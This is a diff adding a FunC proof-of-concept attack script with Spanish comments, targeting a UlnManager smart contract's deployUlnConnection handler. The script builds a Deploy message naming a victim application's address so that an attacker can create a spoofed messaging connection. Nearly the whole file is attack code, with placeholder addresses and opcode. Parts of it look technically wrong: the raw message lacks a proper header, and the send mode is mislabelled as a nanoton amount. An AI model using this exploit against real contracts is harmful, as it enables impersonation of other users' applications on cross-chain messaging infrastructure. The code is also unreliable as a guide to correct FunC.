@@ -1,0 +1,73 @@
+;; =========================================================
+;; PoC FunC — Connection Spoofing en deployUlnConnection
+;; Atacante crea una ULN Connection usando el dstOApp de la víctima
+;; =========================================================
+
+#include <stdlib.fc>
+
+;; Dirección del contrato UlnManager (REEMPLAZAR)
+const int ULN_MANAGER = 0x1234567890ABCDEF;
+
+;; OpCode real para MsglibManager::OP::DEPLOY_CONNECTION
+const int OP_DEPLOY_CONNECTION = 102; ;; Usar valor real aquí
+
+;; =========================================================
+;; UTIL — Construir celda simple
+;; =========================================================
+
+cell build_deploy_payload(int dstEid, int victim) inline {
+    ;; Layout mínimo del msg Deploy:
+    ;; md::Deploy {
+    ;;   dstEid:uint32
+    ;;   dstOApp:address
+    ;;   initialDeposit:coins
+    ;;   extraInfo:cell (InitUlnConnection)
+    ;; }
+
+    builder b = begin_cell();
+
+    ;; dstEid
+    b = b.store_uint(dstEid, 32);
+
+    ;; dstOApp (la víctima)
+    b = b.store_uint(victim, 267);
+
+    ;; initialDeposit = 0.1 TON
+    b = b.store_grams(100000000);
+
+    ;; extraInfo: celda vacía válida
+    b = b.store_ref(begin_cell().end_cell());
+
+    return b.end_cell();
+}
+
+;; =========================================================
+;; FUNCIÓN PRINCIPAL DEL ATAQUE
+;; =========================================================
+() do_attack() impure {
+
+    ;; ==== Paso 1: Definir víctima y dstEid ====
+    int victim = 0x998877665544332211; ;; dirección víctima
+    int dstEid = 101;
+
+    ;; ==== Paso 2: Construir payload Deploy ====
+    cell deploy = build_deploy_payload(dstEid, victim);
+
+    ;; ==== Paso 3: Enviar mensaje al UlnManager ====
+    ;; Esto ejecuta deployUlnConnection()
+    send_raw_message(
+        begin_cell()
+            .store_uint(OP_DEPLOY_CONNECTION, 32)
+            .store_ref(deploy)
+        .end_cell(),
+        1        ;; enviar 1 nanotón para cubrir gas
+    );
+
+}
+
+;; =========================================================
+;; Entrypoint
+;; =========================================================
+() main() impure {
+    do_attack();
+}
